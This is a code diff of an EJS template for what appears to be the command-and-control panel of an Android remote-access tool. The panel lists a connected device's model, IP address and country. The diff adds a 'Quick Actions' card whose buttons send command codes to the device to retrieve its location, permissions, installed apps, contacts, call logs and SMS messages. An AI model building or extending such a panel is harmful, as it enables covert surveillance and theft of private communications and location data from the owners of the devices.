@@ -19,12 +19,12 @@
             <span><%= c.device?.model || '—' %></span>
         </div>
         <div class="info-item">
-            <label>Android</label>
+            <label>Android Version</label>
             <span><%= c.device?.version || '—' %></span>
         </div>
         <div class="info-item">
             <label>IP Address</label>
-            <span><%= c.ip || '—' %></span>
+            <code><%= c.ip || '—' %></code>
         </div>
         <div class="info-item">
             <label>Country</label>
@@ -38,5 +38,19 @@
             <label>Last Seen</label>
             <span><%= new Date(c.lastSeen).toLocaleString() %></span>
         </div>
+    </div>
+</div>
+
+<div class="card">
+    <div class="card-header">
+        <h2>Quick Actions</h2>
+    </div>
+    <div class="btn-group">
+        <button class="btn" onclick="sendCmd('0xLO')">📍 Get Location</button>
+        <button class="btn" onclick="sendCmd('0xPM')">🔐 Check Permissions</button>
+        <button class="btn" onclick="sendCmd('0xIN', {includeSystem: false})">📦 List Apps</button>
+        <button class="btn" onclick="sendCmd('0xCO')">👥 Get Contacts</button>
+        <button class="btn" onclick="sendCmd('0xCL')">📞 Get Call Logs</button>
+        <button class="btn" onclick="sendCmd('0xSM', {action: 'ls'})">💬 Get SMS</button>
     </div>
 </div>
